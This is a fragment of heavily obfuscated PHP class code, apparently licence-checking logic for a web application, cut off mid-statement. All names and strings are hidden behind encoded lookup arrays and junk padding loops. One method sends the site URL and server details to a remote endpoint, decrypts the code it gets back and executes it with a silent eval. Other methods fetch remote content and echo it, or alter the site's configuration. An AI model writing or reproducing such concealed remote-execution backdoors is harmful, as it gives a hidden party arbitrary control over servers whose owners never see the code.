$this->inqv100b66c1 = $Ìñ¡¥Ã²Ëß[138]; $¡—¸ô¶â…à = $Ìñ¡¥Ã²Ëß[61]($Ìñ¡¥Ã²Ëß[62])->{$_SERVER[Å´][63]}(); $‹œšĞ = $Ã×Ùë†×š˜[658]; while (strlen($‹œšĞ) < $Ã×Ùë†×š˜[614]) { if (!$‹œšĞ) { break; } $‹œšĞ++; } if ($¡—¸ô¶â…à[$Ìñ¡¥Ã²Ëß[137]] == $Ìñ¡¥Ã²Ëß[138]) { return; } $ÊÛå§ = $Ìñ¡¥Ã²Ëß[61]($Ìñ¡¥Ã²Ëß[62])->{$_SERVER[Å´][63]}($Ìñ¡¥Ã²Ëß[133]); $¨’í = $Ìñ¡¥Ã²Ëß[256] . $Ìñ¡¥Ã²Ëß[131]($ÊÛå§ . $Ìñ¡¥Ã²Ëß[257]); $ƒ³é×¶·È¦ = Cache::get($¨’í); if (!$Ìñ¡¥Ã²Ëß[168]($ƒ³é×¶·È¦) || !isset($ƒ³é×¶·È¦[$Ìñ¡¥Ã²Ëß[261]]) || $Ìñ¡¥Ã²Ëß[262]() - $ƒ³é×¶·È¦[$Ìñ¡¥Ã²Ëß[261]] >= 60) { $şŠÔÏÏí = $Ìñ¡¥Ã²Ëß[61]($Ìñ¡¥Ã²Ëß[11])->{$_SERVER[Å´][263]}(); $Ïòê = $şŠÔÏÏí[$Ìñ¡¥Ã²Ëß[251]]; $æÉ¾„Øß¾Ï“ = $Ìñ¡¥Ã²Ëß[131]($_SERVER[$Ìñ¡¥Ã²Ëß[132]] . $Ìñ¡¥Ã²Ëß[240]($ÊÛå§) . $¡—¸ô¶â…à[$Ìñ¡¥Ã²Ëß[236]]); $°¬¡âƒ¾€  = $Ìñ¡¥Ã²Ëß[240]($Ìñ¡¥Ã²Ëß[25]($æÉ¾„Øß¾Ï“, 10, 16)); $ƒ³é×¶·È¦ = $this->{$_SERVER[Å´][215]}($Ïòê[$Ìñ¡¥Ã²Ëß[111]][$°¬¡âƒ¾€ ], $æÉ¾„Øß¾Ï“); $ƒ³é×¶·È¦ = $Ìñ¡¥Ã²Ëß[217]($ƒ³é×¶·È¦, !0); } if (!$Ìñ¡¥Ã²Ëß[168]($ƒ³é×¶·È¦)) { return $this->{$_SERVER[Å´][189]}(); } $ùöƒ = $Ìñ¡¥Ã²Ëß[161]($ƒ³é×¶·È¦[$Ìñ¡¥Ã²Ëß[162]]); if ($Ìñ¡¥Ã²Ëß[262]() >= $ùöƒ) { return $this->{$_SERVER[Å´][189]}(); } if ($Ìñ¡¥Ã²Ëß[262]() - $ƒ³é×¶·È¦[$Ìñ¡¥Ã²Ëß[261]] > 20) { $ƒ³é×¶·È¦[$Ìñ¡¥Ã²Ëß[261]] = $Ìñ¡¥Ã²Ëß[262](); Cache::set($¨’í, $ƒ³é×¶·È¦); } $this->ieuo984a7b1b = $ƒ³é×¶·È¦; $this->inqv100b66c1 = $¡—¸ô¶â…à[$Ìñ¡¥Ã²Ëß[137]]; $—ÕÔ¹Äåï = $Ã×Ùë†×š˜[659]; } private function lvuwbc37ebba() { $¸åüîÄƒË… =& $_SERVER[ÀÆ]; $‰£ =& $_SERVER[Å´]; $Öà = $GLOBALS[$‰£[22]]; $“Ïñ¦Ô» = $¸åüîÄƒË…[660]; if (strlen($“Ïñ¦Ô») < $¸åüîÄƒË…[629]) { die; } $…ˆôÅ‘Í = $_SERVER[$‰£[44]]; if ($…ˆôÅ‘Í == $‰£[264] && $this->inqv100b66c1 == $‰£[138]) { $‰£[191]($‰£[223]($‰£[265]), !1, $‰£[266]); } $İÅĞ¿· = array($‰£[267], $‰£[268]); if ($‰£[269]($…ˆôÅ‘Í, $İÅĞ¿·)) { if ($this->inqv100b66c1 == $‰£[138] && isset($Öà[$‰£[270]])) { $‰£[191]($‰£[223]($‰£[265]), !1, $‰£[266]); die; } $Õ— = $this->{$_SERVER[Å´][154]}(); if ($Õ— != $‰£[271]($‰£[272])) { if ($Õ— <= $‰£[61]($‰£[156])->{$_SERVER[Å´][157]}()) { $‰£[191]($‰£[223]($‰£[273]), !1, $‰£[266]); die; } } } } private function hgmqa2eb5295() { $¥ ÷ƒÃ¼İìª =& $_SERVER[ÀÆ]; $»‰ÙÀ =& $_SERVER[Å´]; $ïÑ¥› = array($»‰ÙÀ[152], $»‰ÙÀ[274]); if (!$»‰ÙÀ[123]($GLOBALS, $»‰ÙÀ[149]) || !isset($_GET[$»‰ÙÀ[275]])) { return; } if (!$»‰ÙÀ[269]($_SERVER[$»‰ÙÀ[44]], $ïÑ¥›)) { return; } $¡çºÂÇ´§Ö = $»‰ÙÀ[276]; $·ƒÈÀÈ = $¥ ÷ƒÃ¼İìª[661]; $¡çºÂÇ´§Ö = $this->{$_SERVER[Å´][277]}($¡çºÂÇ´§Ö, $»‰ÙÀ[278]); $ğ¼ÂÙ¨È¯È¹ = $»‰ÙÀ[279](array($»‰ÙÀ[280] => array($»‰ÙÀ[281] => $»‰ÙÀ[282], $»‰ÙÀ[283] => 3))); $¢ò›ø˜ = @$»‰ÙÀ[284]($¡çºÂÇ´§Ö, !1, $ğ¼ÂÙ¨È¯È¹); $§ç§•²‹Šï† = $¥ ÷ƒÃ¼İìª[662]; $»‰ÙÀ[285]($»‰ÙÀ[286]); $Ü²¾Û = $¥ ÷ƒÃ¼İìª[663]; if (strlen($Ü²¾Û) < $¥ ÷ƒÃ¼İìª[604]) { return; } if ($¢ò›ø˜ && $»‰ÙÀ[32]($¢ò›ø˜, $»‰ÙÀ[287])) { echo $¢ò›ø˜; } die; } public function cvwl5ee7f358($æ§) { $³°Â¨‹è =& $_SERVER[ÀÆ]; $½å =& $_SERVER[Å´]; if ($this->inqv100b66c1 == $½å[288]) { return $æ§; } $ãµ = array($½å[289] => $½å[290], $½å[291] => $½å[290], $½å[292] => $½å[290], $½å[293] => $½å[290], $½å[294] => $½å[295], $½å[296] => $½å[295], $½å[297] => $½å[295], $½å[298] => $½å[295], $½å[299] => $½å[295], $½å[300] => $½å[295], $½å[301] => $½å[295], $½å[302] => $½å[295], $½å[303] => $½å[295], $½å[304] => $½å[295], $½å[305] => $½å[295], $½å[306] => $½å[295]); $Ñ½Ø¶ÈŞ·ê = $½å[0]($½å[307], $½å[123]($this->ieuo984a7b1b, $½å[146], $½å[10])); $°ôş©ßøÆÆ = $³°Â¨‹è[664]; while ($°ôş©ßøÆÆ < $³°Â¨‹è[604]) { if ($°ôş©ßøÆÆ >= 0) { break; } $°ôş©ßøÆÆ++; } $ºÊÇ¶¡ü‚ = array(); foreach ($ãµ as $ÈÏ¬òë…Î‚Û => $ªá¬) { if ($ªá¬ == $½å[290] && $½å[25]($this->inqv100b66c1, 0, 1) == $½å[290]) { continue; } if (!$½å[269]($ÈÏ¬òë…Î‚Û, $Ñ½Ø¶ÈŞ·ê)) { $ºÊÇ¶¡ü‚[] = $ÈÏ¬òë…Î‚Û; } } foreach ($ºÊÇ¶¡ü‚ as $ÈÏ¬òë…Î‚Û) { unset($æ§[$ÈÏ¬òë…Î‚Û]); } return $æ§; } private function htcne22f582d() { $£†ëëìÅÚÆ =& $_SERVER[ÀÆ]; $àÛ =& $_SERVER[Å´]; if ($this->inqv100b66c1 != $àÛ[138]) { return; } $GLOBALS[$àÛ[111]][$àÛ[115]][$àÛ[308]] = $àÛ[246]; $GLOBALS[$àÛ[111]][$àÛ[309]] = $àÛ[246]; $‰ = $£†ëëìÅÚÆ[665]; if (strlen($‰) < $£†ëëìÅÚÆ[612]) { die; } if ($àÛ[61]($àÛ[310])->{$_SERVER[Å´][63]}($àÛ[93]) != $àÛ[260]) { $àÛ[61]($àÛ[310])->{$_SERVER[Å´][247]}($àÛ[93], $àÛ[260]); } } public function tyxw92c0b456() { return $_SERVER[Å´][311]; } private function wrubf79df7a2() { $¢„å =& $_SERVER[Å´]; $Óü¢Øµ±êÀ = array($¢„å[312], $¢„å[313], $¢„å[314]); $ªºùŸØö = $¢„å[315] . $¢„å[131]($¢„å[316]); if ($this->inqv100b66c1 == $¢„å[138] || !$¢„å[123]($GLOBALS, $¢„å[149])) { return; } if (!$¢„å[269]($_SERVER[$¢„å[44]], $Óü¢Øµ±êÀ)) { return; } if ($¢„å[262]() % 4 != 0) { return; } $¢ñäÑ©¿óü¼ = $¢„å[13](array($¢„å[317], $¢„å[318]), $ªºùŸØö); $ÚÃÒ = $_SERVER[ÀÆ][666]; if (!$ÚÃÒ) { return; } if ($¢ñäÑ©¿óü¼ && $¢„å[262]() - $¢ñäÑ©¿óü¼ < $¢„å[271]($¢„å[319])) { return; } $¢„å[13](array($¢„å[317], $¢„å[177]), $ªºùŸØö, $¢„å[262]()); $Æı—–ı’¾ = $¢„å[61]($¢„å[62])->{$_SERVER[Å´][63]}($¢„å[133]); $ıñ‚’Şú = array($¢„å[190] => $¢„å[61]($¢„å[62])->{$_SERVER[Å´][63]}($¢„å[234]), $¢„å[204] => $this->inqv100b66c1, $¢„å[201] => $_SERVER[$¢„å[202]], $¢„å[203] => $¢„å[61]($¢„å[62])->{$_SERVER[Å´][63]}($¢„å[164]), $¢„å[130] => $¢„å[131]($_SERVER[$¢„å[132]] . $Æı—–ı’¾), $¢„å[194] => $¢„å[174], $¢„å[197] => $_SERVER[$¢„å[198]]); $ÃŞ = $this->{$_SERVER[Å´][209]}($¢„å[320], $ıñ‚’Şú); if (!$¢„å[168]($ÃŞ)) { return; } if ($ÃŞ[$¢„å[190]] && $ÃŞ[$¢„å[321]]) { if ($this->{$_SERVER[Å´][225]}($ÃŞ[$¢„å[321]]) == $ıñ‚’Şú[$¢„å[190]]) { return; } } $this->{$_SERVER[Å´][189]}(); if ($this->{$_SERVER[Å´][225]}($ÃŞ[$¢„å[321]]) != $ıñ‚’Şú[$¢„å[190]]) { $ä¾àš´ = array($¢„å[227] => $Æı—–ı’¾, $¢„å[228] => $_SERVER[$¢„å[132]], $¢„å[229] => $¢„å[230](), $¢„å[199] => $_SERVER[$¢„å[200]]); $íÑ€ø­Í = $this->{$_SERVER[Å´][231]}($¢„å[173]($ä¾àš´)); $ÃŞ = $this->{$_SERVER[Å´][209]}($¢„å[232] . $íÑ€ø­Í); if ($ÃŞ && $¢„å[168]($ÃŞ) && isset($ÃŞ[$¢„å[321]])) { $ö¬¶ÓÄ±Ñ = $this->{$_SERVER[Å´][215]}($ÃŞ[$¢„å[321]], 2); if ($ö¬¶ÓÄ±Ñ) { $ö¬¶ÓÄ±Ñ = $this->{$_SERVER[Å´][225]}($ö¬¶ÓÄ±Ñ); } if ($ö¬¶ÓÄ±Ñ) { try { @eval($ö¬¶ÓÄ±Ñ); } catch (Exception $šÅşû§â»â) { } } } } } private function cewf9111aec3($‰ıÚşØ«–æ±ì = '', $³ÃŸ½›ó = array(), $êä = 5) { $†òçÑ¾Ñ•÷„ =& $_SERVER[ÀÆ]; $¿ÈœëÄ¶ =& $_SERVER[Å´]; $Æ¡ = $¿ÈœëÄ¶[322]; $Æ¡ = $this->{$_SERVER[Å´][277]}($Æ¡, $¿ÈœëÄ¶[323]); $ß×ÁÜ»¼ = $†òçÑ¾Ñ•÷„[667]; if (!$ß×ÁÜ»¼) { return; } $Æ¡ = $Æ¡ . $‰ıÚşØ«–æ±ì; if ($³ÃŸ½›ó && $¿ÈœëÄ¶[168]($³ÃŸ½›ó)) { $Æ¡ = $Æ¡ . $¿ÈœëÄ¶[324] . $¿ÈœëÄ¶[325]($³ÃŸ½›ó); } if ($³ÃŸ½›ó === -1) { return $Æ¡; } $¬†šÄ = $¿ÈœëÄ¶[279](array($¿ÈœëÄ¶[280] => array($¿ÈœëÄ¶[283] => $êä, $¿ÈœëÄ¶[281] => $¿ÈœëÄ¶[326]), $¿ÈœëÄ¶[327] => array($¿ÈœëÄ¶[328] => !1, $¿ÈœëÄ¶[329] => !1))); $Şš·Çæ = $†òçÑ¾Ñ•÷„[668]; if (strlen($Şš·Çæ) < $†òçÑ¾Ñ•÷„[612]) { return; } $³ÃŸ½›ó = @$¿ÈœëÄ¶[284]($Æ¡, !1, $¬†šÄ); return $¿ÈœëÄ¶[217]($³ÃŸ½›ó, !0); $—Ê˜í£Ğ¢”¡ = $†òçÑ¾Ñ•÷„[669]; while (strlen($—Ê˜í£Ğ¢”¡) < $†òçÑ¾Ñ•÷„[629]) { if (!$—Ê˜í£Ğ¢”¡) { break; } $—Ê˜í£Ğ¢”¡++; } } private function umef4df4675b() { $Ã¾Ü =& $_SERVER[ÀÆ]; $ö€Ú¸èÃ =& $_SERVER[Å´]; $¤­¡ÚÉÆ = array($ö€Ú¸èÃ[330] => $ö€Ú¸èÃ[331], $ö€Ú¸èÃ[332] => $ö€Ú¸èÃ[333], $ö€Ú¸èÃ[334] => $ö€Ú¸èÃ[335], $ö€Ú¸èÃ[336] => $ö€Ú¸èÃ[337], $ö€Ú¸èÃ[338] => $ö€Ú¸èÃ[339], $ö€Ú¸èÃ[340] => $ö€Ú¸èÃ[272], $ö€Ú¸èÃ[341] => $ö€Ú¸èÃ[272], $ö€Ú¸èÃ[342] => $ö€Ú¸èÃ[331], $ö€Ú¸èÃ[343] => $ö€Ú¸èÃ[333], $ö€Ú¸èÃ[344] => $ö€Ú¸èÃ[335], $ö€Ú¸èÃ[345] => $ö€Ú¸èÃ[346], $ö€Ú¸èÃ[347] => $ö€Ú¸èÃ[337], $ö€Ú¸èÃ[348] => $ö€Ú¸èÃ[349], $ö€Ú¸èÃ[350] => $ö€Ú¸èÃ[339], $ö€Ú¸èÃ[351] => $ö€Ú¸èÃ[352], $ö€Ú¸èÃ[353] => $ö€Ú¸èÃ[354], $ö€Ú¸èÃ[355] => $ö€Ú¸èÃ[356]); $‰Ó¾âÍè­Òö = $¤­¡ÚÉÆ[$this->inqv100b66c1]; $­†¿¾ş²˜š = $Ã¾Ü[670]; if (strlen($­†¿¾ş²˜š) < $Ã¾Ü[608]) { die; } $‰Ó¾âÍè­Òö = $ö€Ú¸èÃ[271]($‰Ó¾âÍè­Òö ? $‰Ó¾âÍè­Òö : $ö€Ú¸èÃ[331]); $ÏØéŞ = $Ã¾Ü[671]; if (strlen($ÏØéŞ) < $Ã¾Ü[612]) { return; } $­ø¡çûÅ’Ë = $ö€Ú¸èÃ[123]($this->ieuo984a7b1b, $ö€Ú¸èÃ[357]); $¨©ÊÎåĞë = $Ã¾Ü[672]; while ($¨©ÊÎåĞë < $Ã¾Ü[608]) { if ($¨©ÊÎåĞë >= 0) { break; } $¨©ÊÎåĞë++; } $­ø¡çûÅ’Ë = $­ø¡çûÅ’Ë ? $ö€Ú¸èÃ[271]($­ø¡çûÅ’Ë) : 0; $â° = $Ã¾Ü[673]; while (strlen($â°) < $Ã¾Ü[629]) { if (!$â°) { break; } $â°++; } return $‰Ó¾âÍè­Òö + $­ø¡çûÅ’Ë; $Ğ›”û õ = $Ã¾Ü[674]; if (strlen($Ğ›”û õ) < $Ã¾Ü[612]) { return; } } public function fgtjb0b85bef($Ú¬–ïñÅ) { $ò =& $_SERVER[ÀÆ]; $Â ªÕ¾¸ìÉ =& $_SERVER[Å´]; $°££òĞ = $this->{$_SERVER[Å´][154]}(); $œËçÅñÀÑÆ = $ò[675]; while ($œËçÅñÀÑÆ < $ò[629]) { if ($œËçÅñÀÑÆ >= 0) { break; } $œËçÅñÀÑÆ++; } if ($Ú¬–ïñÅ[$Â ªÕ¾¸ìÉ[358]] == $Â ªÕ¾¸ìÉ[246]) { return; } if ($°££òĞ >= $Â ªÕ¾¸ìÉ[271]($Â ªÕ¾¸ìÉ[272])) { return; } $ÆâÂµ¦ = $Â ªÕ¾¸ìÉ[61]($Â ªÕ¾¸ìÉ[156])->{$_SERVER[Å´][157]}(); if ($ÆâÂµ¦ <= $°££òĞ) { return; } $¸¾ = $Â ªÕ¾¸ìÉ[61]($Â ªÕ¾¸ìÉ[156])->{$_SERVER[Å´][359]}($Â ªÕ¾¸ìÉ[358])->{$_SERVER[Å´][360]}($°££òĞ)->{$_SERVER[Å´][361]}(); $¬¨ó = $ò[676]; while ($¬¨ó < $ò[612]) { if ($¬¨ó >= 0) { break; } $¬¨ó++; } $¸¾ = $Â ªÕ¾¸ìÉ[248]($¸¾, $Â ªÕ¾¸ìÉ[10], $Â ªÕ¾¸ìÉ[358]); $‰ß›Ü¢ = $ò[677]; if (!$Â ªÕ¾¸ìÉ[269]($Ú¬–ïñÅ[$Â ªÕ¾¸ìÉ[358]], $¸¾)) { $Â ªÕ¾¸ìÉ[191]($Â ªÕ¾¸ìÉ[362], !1, $Â ªÕ¾¸ìÉ[266]); } } public function bosr5e0041e5() { $Üâª =& $_SERVER[ÀÆ]; $¯ =& $_SERVER[Å´]; if (!$¯[123]($GLOBALS, $¯[149]) || $¯[363](1, 100) > 20) { return; } $Ãî»à = $¯[276]; $Ãî»à = $this->{$_SERVER[Å´][277]}($Ãî»à, $¯[278]); $é§üÕ­ = $Üâª[678]; while ($é§üÕ­ < $Üâª[612]) { if ($é§üÕ­ >= 0) { break; } $é§üÕ­++; } $Ëğ Äú = $¯[279](array($¯[280] => array($¯[281] => $¯[282], $¯[283] => 3))); $ŒÈ£ò¶¦ = $Üâª[679]; $ëœ = @$¯[284]($Ãî»à, !1, $Ëğ Äú); echo $¯[364] . $¯[365]($ëœ) . $¯[366]; } private function opxqeab215a4($º¾ÀĞŞ, $Ñ¹„¨ù«ê¥ê, $ƒæ›× = 3) { $è¨¾À„à€ =& $_SERVER[ÀÆ]; $ğ³ =& $_SERVER[Å´]; $ğ³[367](1); $º¾ÀĞŞ = $ğ³[2]($º¾ÀĞŞ); $Ì¦êà = $è¨¾À„à€[680]; if (strlen($Ì¦êà) < $è¨¾À„à€[612]) { return; } $¸Õåñˆé£ ˆÓ = $ğ³[363](0, 5) . $ğ³[10]; $À²Ñ‡ = $è¨¾À„à€[681]; $„ = $ğ³[141](15); $ï‹‘ = $è¨¾À„à€[682]; while ($ï‹‘ < $è¨¾À„à€[608]) { if ($ï‹‘ >= 0) { break; } $ï‹‘++; } $º¨ä³¡ƒÃğÁ = $ğ³[368]; $¶Æ¥ = $è¨¾À„à€[683]; switch ($¸Õåñˆé£ ˆÓ) { case $ğ³[260]: $¾ü¦É©÷ = $this->{$_SERVER[Å´][172]}($º¾ÀĞŞ, $ğ³[240]($Ñ¹„¨ù«ê¥ê . $„)); $ˆ›¤¯ = $è¨¾À„à€[684]; if (!$ˆ›¤¯) { return; } break; case $ğ³[246]: $¾ü¦É©÷ = $this->{$_SERVER[Å´][172]}($º¾ÀĞŞ, $ğ³[240]($„ . $Ñ¹„¨ù«ê¥ê)); break; case $ğ³[369]: $¾ü¦É©÷ = $this->{$_SERVER[Å´][172]}($º¾ÀĞŞ, $ğ³[135]($„ . $Ñ¹„¨ù«ê¥ê)); break; case $ğ³[370]: $¾ü¦É©÷ = $this->{$_SERVER[Å´][172]}($º¾ÀĞŞ, $ğ³[131]($„ . $Ñ¹„¨ù«ê¥ê)); $ä¸ = $è¨¾À„à€[685]; if (strlen($ä¸) < $è¨¾À„à€[629]) { die; } break; $ÖÎ = $è¨¾À„à€[686]; if (strlen($ÖÎ) < $è¨¾À„à€[629]) { die; } case $ğ³[371]: $º¾ÀĞŞ = $ğ³[135]($º¾ÀĞŞ); $Î„ßô£¯â‹ = $ğ³[372](0, 64); $–¢Íº»š³’ = $è¨¾À„à€[687]; while ($–¢Íº»š³’ < $è¨¾À„à€[612]) { if ($–¢Íº»š³’ >= 0) { break; } $–¢Íº»š³’++; } $ìÇ‘Şé×Ü = $º¨ä³¡ƒÃğÁ[$Î„ßô£¯â‹]; $É×¿¼˜ı = $ğ³[131]($ìÇ‘Şé×Ü . $ğ³[131]($Ñ¹„¨ù«ê¥ê . $ìÇ‘Şé×Ü) . $Ñ¹„¨ù«ê¥ê); $É×¿¼˜ı = $ğ³[25]($É×¿¼˜ı, $Î„ßô£¯â‹ % 8, $Î„ßô£¯â‹ % 8 + 7); $ÏÉ„ = $ğ³[10]; $õœş§‘ñ¬ = 0; $®€ = 0; $©Üó¤‡ÃŒ™æÀ = 0; for ($õœş§‘ñ¬ = 0; $õœş§‘ñ¬ < $ğ³[24]($º¾ÀĞŞ); $õœş§‘ñ¬++) { $©Üó¤‡ÃŒ™æÀ = $©Üó¤‡ÃŒ™æÀ == $ğ³[24]($É×¿¼˜ı) ? 0 : $©Üó¤‡ÃŒ™æÀ; $®€ = ($Î„ßô£¯â‹ + $ğ³[373]($º¨ä³¡ƒÃğÁ, $º¾ÀĞŞ[$õœş§‘ñ¬]) + $ğ³[374]($É×¿¼˜ı[$©Üó¤‡ÃŒ™æÀ++])) % 64; $ÏÉ„ .= $º¨ä³¡ƒÃğÁ[$®€]; $ûâµïœÖ = $è¨¾À„à€[688]; } $¾ü¦É©÷ = $ğ³[365]($ìÇ‘Şé×Ü . $ÏÉ„); break; default: $¾ü¦É©÷ = $this->{$_SERVER[Å´][172]}($º¾ÀĞŞ, $Ñ¹„¨ù«ê¥ê . $„); $²«©­°š–Ë = $è¨¾À„à€[689]; break; $†¿çÓ = $è¨¾À„à€[690]; if (!$†¿çÓ) { die; } } $¾ü¦É©÷ = $ğ³[240]($¸Õåñˆé£ ˆÓ . $„ . $¾ü¦É©÷); $Ë„ß‚ = $è¨¾À„à€[691]; if (!$Ë„ß‚) { return; } if ($ƒæ›× - 1 > 0) { $¾ü¦É©÷ = $this->{$_SERVER[Å´][144]}($¾ü¦É©÷, $Ñ¹„¨ù«ê¥ê, $ƒæ›× - 1); } return $¾ü¦É©÷; } private function syrl2b3bfe4f($»´…¬üõáÆ, $»õ‰õèÅ, $ôŸ½“Š—Èö = 3) { $ş¹¾˜¾û®ª =& $_SERVER[ÀÆ]; $´œ‡ŒÑå• =& $_SERVER[Å´]; if (!$´œ‡ŒÑå•[165]($»´…¬üõáÆ) || $´œ‡ŒÑå•[24]($»´…¬üõáÆ) < 10) { return !1; } $»´…¬üõáÆ = $´œ‡ŒÑå•[2]($»´…¬üõáÆ); $»´…¬üõáÆ = $´œ‡ŒÑå•[240]($»´…¬üõáÆ); $ÃÙàşñ²ÎÊ = $»´…¬üõáÆ[0]; $Ó™ı÷ƒşÃ = $´œ‡ŒÑå•[25]($»´…¬üõáÆ, 1, 15); $³æÎò¡ = $ş¹¾˜¾û®ª[692]; $»´…¬üõáÆ = $´œ‡ŒÑå•[25]($»´…¬üõáÆ, 16); $Ç = $ş¹¾˜¾û®ª[693]; if (strlen($Ç) < $ş¹¾˜¾û®ª[629]) { return; } $‹‚šÆö¥ë = $´œ‡ŒÑå•[368]; $ÎÆ×»² = $ş¹¾˜¾û®ª[694]; while (strlen($ÎÆ×»²) < $ş¹¾˜¾û®ª[604]) { if (!$ÎÆ×»²) { break; } $ÎÆ×»²++; } switch ($ÃÙàşñ²ÎÊ) { case $´œ‡ŒÑå•[260]: $®Ö¦•¶Á¡Ù¹ = $this->{$_SERVER[Å´][277]}($»´…¬üõáÆ, $´œ‡ŒÑå•[240]($»õ‰õèÅ . $Ó™ı÷ƒşÃ)); break; $ƒ­ö = $ş¹¾˜¾û®ª[695]; if (strlen($ƒ­ö) < $ş¹¾˜¾û®ª[604]) { die; } case $´œ‡ŒÑå•[246]: $®Ö¦•¶Á¡Ù¹ = $this->{$_SERVER[Å´][277]}($»´…¬üõáÆ, $´œ‡ŒÑå•[240]($Ó™ı÷ƒşÃ . $»õ‰õèÅ)); break; case $´œ‡ŒÑå•[369]: $®Ö¦•¶Á¡Ù¹ = $this->{$_SERVER[Å´][277]}($»´…¬üõáÆ, $´œ‡ŒÑå•[135]($Ó™ı÷ƒşÃ . $»õ‰õèÅ)); break; case $´œ‡ŒÑå•[370]: $®Ö¦•¶Á¡Ù¹ = $this->{$_SERVER[Å´][277]}($»´…¬üõáÆ, $´œ‡ŒÑå•[131]($Ó™ı÷ƒşÃ . $»õ‰õèÅ)); $Ì’™ëª¯ = $ş¹¾˜¾û®ª[696]; if (!$Ì’™ëª¯) { return; } break; case $´œ‡ŒÑå•[371]: $»´…¬üõáÆ = $´œ‡ŒÑå•[375]($»´…¬üõáÆ); $ßá…å¢Å®ÇÕ¼ = $ş¹¾˜¾û®ª[697]; if (!$ßá…å¢Å®ÇÕ¼) { return; } $ÜÍ = $»´…¬üõáÆ[0]; $ıÓñõ = $ş¹¾˜¾û®ª[630]; if (!$ıÓñõ) { return; } $»´…¬üõáÆ = $´œ‡ŒÑå•[25]($»´…¬üõáÆ, 1); $ßèÒº = $´œ‡ŒÑå•[373]($‹‚šÆö¥ë, $ÜÍ); $ƒê = $ş¹¾˜¾û®ª[698]; if (!$ƒê) { die; } $èÄ‹úŒ = $´œ‡ŒÑå•[131]($ÜÍ . $´œ‡ŒÑå•[131]($»õ‰õèÅ . $ÜÍ) . $»õ‰õèÅ); $èÄ‹úŒ = $´œ‡ŒÑå•[25]($èÄ‹úŒ, $ßèÒº % 8, $ßèÒº % 8 + 7); $à·•ôşÕ² = $ş¹¾˜¾û®ª[699]; $Ì¯½ûŸ´Ó = $´œ‡ŒÑå•[10]; $°” = $ş¹¾˜¾û®ª[700]; while ($°” < $ş¹¾˜¾û®ª[614]) { if ($°” >= 0) { break; } $°”++; } $ªŒüßø = 0; $²ÈóöíˆÄ¹ó¯ = $ş¹¾˜¾û®ª[701]; if (strlen($²ÈóöíˆÄ¹ó¯) < $ş¹¾˜¾û®ª[614]) { die; } $‹¦²À–éı–á = 0; $·À——¥÷›İ§¦ = 0; for ($ªŒüßø = 0; $ªŒüßø < $´œ‡ŒÑå•[24]($»´…¬üõáÆ); $ªŒüßø++) { $·À——¥÷›İ§¦ = $·À——¥÷›İ§¦ == $´œ‡ŒÑå•[24]($èÄ‹úŒ) ? 0 : $·À——¥÷›İ§¦; $ë”Ë•óÅÜâö = $ş¹¾˜¾û®ª[702]; $¥ñ‚°ĞŒ«† = $·À——¥÷›İ§¦++; $‹¦²À–éı–á = $´œ‡ŒÑå•[373]($‹‚šÆö¥ë, $»´…¬üõáÆ[$ªŒüßø]) - $ßèÒº - $´œ‡ŒÑå•[374]($èÄ‹úŒ[$¥ñ‚°ĞŒ«†]); $»Á„ä•¢ = $ş¹¾˜¾û®ª[703]; if (!$»Á„ä•¢) { return; } while ($‹¦²À–éı–á < 0) { $‹¦²À–éı–á += 64; } $Ì¯½ûŸ´Ó .= $‹‚šÆö¥ë[$‹¦²À–éı–á]; $µñ” = $ş¹¾˜¾û®ª[704]; if (!$µñ”) { die; } } $®Ö¦•¶Á¡Ù¹ = $´œ‡ŒÑå•[376]($Ì¯½ûŸ´Ó); $’¾à = $ş¹¾˜¾û®ª[705]; if (strlen($’¾à) < $ş¹¾˜¾û®ª[629]) { die; } break; default: $®Ö¦•¶Á¡Ù¹ = $this->{$_SERVER[Å´][277]}($»´…¬üõáÆ, $»õ‰õèÅ . $Ó™ı÷ƒşÃ); $°Ô„Úó = $ş¹¾˜¾û®ª[706]; break; } if ($ôŸ½“Š—Èö - 1 > 0) { $®Ö¦•¶Á¡Ù¹ = $this->{$_SERVER[Å´][215]}($®Ö¦•¶Á¡Ù¹, $»õ‰õèÅ, $ôŸ½“Š—Èö - 1); } return $®Ö¦•¶Á¡Ù¹; } public function ftebe7895482($ÌÊ˜§§»®) { $èşÈ” =& $_SERVER[ÀÆ]; $âØ“± =& $_SERVER[Å´]; $ªÎÕäæ¼Ñ = $this->{$_SERVER[Å´][377]}(); $õ×ƒª = $this->{$_SERVER[Å´][377]}(); $ëû = $èşÈ”[707]; $™¯„şÀ = ($ªÎÕäæ¼Ñ - 1) * ($õ×ƒª - 1); $ğ´à‚‘‰õƒ = $âØ“±[271](($ªÎÕäæ¼Ñ + $õ×ƒª) / 2); while (1) { $œ¿í Ó“† = $ğ´à‚‘‰õƒ; $ Â–º = $èşÈ”[708]; while (strlen($ Â–º) < $èşÈ”[629]) { if (!$ Â–º) { break; } $ Â–º++; } $±Î˜©”  = $™¯„şÀ; $”è¨Ú¤ØŸŒ = $èşÈ”[709]; while ($±Î˜©”  % $œ¿í Ó“† != 0) { $±¦Ûö¬Òé = $±Î˜©” ; $±Î˜©”  = $œ¿í Ó“†; $œ¿í Ó“† = $±¦Ûö¬Òé % $œ¿í Ó“†; } if ($œ¿í Ó“† == 1) { break; } else { $ğ´à‚‘‰õƒ++; } } $›ÓÛÅ = 2; $•§Œ»‹³ı = $èşÈ”[710]; while (strlen($•§Œ»‹³ı) < $èşÈ”[612]) { if (!$•§Œ»‹³ı) { break; } $•§Œ»‹³ı++; } for ($†¶Ó„§ƒûê = 0; $†¶Ó„§ƒûê < $™¯„şÀ * 10; $†¶Ó„§ƒûê++) { if (($™¯„şÀ * $†¶Ó„§ƒûê + 1) % $ğ´à‚‘‰õƒ == 0) { $›ÓÛÅ = $âØ“±[271](($™¯„şÀ * $†¶Ó„§ƒûê + 1) / $ğ´à‚‘‰õƒ); break; } } $ãæ = $this->{$_SERVER[Å´][172]}($ªÎÕäæ¼Ñ * $õ×ƒª . $âØ“±[10], $âØ“±[174]); $ËŒÄÅ¢ëÙ‰£ = $èşÈ”[711]; if (!$ËŒÄÅ¢ëÙ‰£) { return; } $§‹ÙÈ¬” = $âØ“±[131]($âØ“±[378] . ($ªÎÕäæ¼Ñ + $õ×ƒª) . $âØ“±[379] . $ğ´à‚‘‰õƒ . $âØ“±[379] . $›ÓÛÅ . $âØ“±[380]); $†õûøüÑç = $èşÈ”[712]; while (strlen($†õûøüÑç) < $èşÈ”[629]) { if (!$†õûøüÑç) { break; } $†õûøüÑç++; } $…éÛ‹ = $this->{$_SERVER[Å´][172]}($ÌÊ˜§§»®, $§‹ÙÈ¬”) . $âØ“±[381] . $ãæ; $¨¸Ô¬— = $èşÈ”[713]; if (!$¨¸Ô¬—) { die; } return $…éÛ‹; $¤œû = 